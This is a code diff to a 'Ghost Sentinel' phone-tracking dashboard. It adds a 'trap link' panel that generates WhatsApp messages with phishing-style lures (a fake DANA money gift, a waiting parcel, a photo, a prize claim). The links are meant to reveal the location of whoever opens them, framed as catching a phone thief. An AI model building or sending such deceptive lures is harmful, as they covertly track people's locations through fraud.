@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ghost Sentinel — Dashboard</title>
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
   <style>
     :root{
       --bg:#030712;--panel:rgba(15,23,42,.9);--border:rgba(255,255,255,.1);
@@ -269,6 +269,15 @@
         <div id="beaconFeed"></div>
       </div>
 
+      <!-- Link Jebakan -->
+      <div class="sidebar-section">
+        <div class="section-title">🪤 Link Jebakan (HP Sudah Dicuri)</div>
+        <div style="font-size:12px;color:var(--muted);margin-bottom:10px;line-height:1.5">
+          Kirim salah satu link ini ke nomormu sendiri. Jika pencuri membuka link, lokasi mereka langsung masuk ke peta.
+        </div>
+        <div style="display:flex;flex-direction:column;gap:6px" id="trapLinks"></div>
+      </div>
+
       <!-- Actions -->
       <div class="sidebar-section">
         <div style="display:flex;gap:8px;flex-wrap:wrap">
@@ -412,8 +421,45 @@ function startDashboard() {
   document.getElementById('authPanel').style.display = 'none';
   document.getElementById('authError').style.display = 'none';
   document.getElementById('dashPanel').style.display = 'block';
+  renderTrapLinks();
   loadData();
   setInterval(loadData, 30_000); // auto-refresh 30 dtk
+}
+
+function renderTrapLinks() {
+  generateTrapLinks();
+}
+
+function generateTrapLinks() {
+  const base = 'https://fiezel.my.id/sentinel';
+  const id = SESSION.deviceId;
+  const types = [
+    { label: '💙 DANA Kaget',       url: `${base}/dana.html?d=${id}`,             wa: '🎁 Kamu dapat DANA Kaget! Buka sekarang sebelum kedaluwarsa: ' },
+    { label: '📦 Paket Menunggumu', url: `${base}/paket.html?d=${id}`,            wa: '📦 Ada paket untukmu yang belum diambil! Konfirmasi segera: ' },
+    { label: '🖼️ Ada Foto Untukmu', url: `${base}/trap.html?d=${id}&type=foto`,   wa: 'Kamu punya kiriman foto baru. Lihat sekarang: ' },
+    { label: '🎁 Kamu Terpilih',    url: `${base}/trap.html?d=${id}&type=hadiah`, wa: 'Selamat! Nomor kamu terpilih. Klaim sebelum kadaluarsa: ' },
+  ];
+  const el = document.getElementById('trapLinks');
+  el.innerHTML = types.map(t => {
+    const waUrl = `https://wa.me/?text=${encodeURIComponent(t.wa + t.url)}`;
+    return `<div style="background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:10px;padding:10px 12px">
+      <div style="font-size:12px;font-weight:700;margin-bottom:4px">${t.label}</div>
+      <div style="font-size:10px;color:var(--muted);margin-bottom:8px;word-break:break-all">${t.url}</div>
+      <div style="display:flex;gap:6px">
+        <button class="btn-sm btn-blue" style="flex:1;font-size:11px" onclick="copyTrap('${encodeURIComponent(t.url)}')">Salin Link</button>
+        <a href="${waUrl}" target="_blank" style="flex:1">
+          <button class="btn-sm" style="width:100%;background:#25d366;color:#fff;font-size:11px">WhatsApp →</button>
+        </a>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function copyTrap(encodedUrl) {
+  const url = decodeURIComponent(encodedUrl);
+  try { navigator.clipboard.writeText(url); showToast('Link disalin!'); } catch {
+    prompt('Salin link ini:', url);
+  }
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -714,6 +760,6 @@ if (SESSION.deviceId && SESSION.token) {
   startDashboard();
 }
 </script>
-<script src="/qrcode.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </body>
 </html>
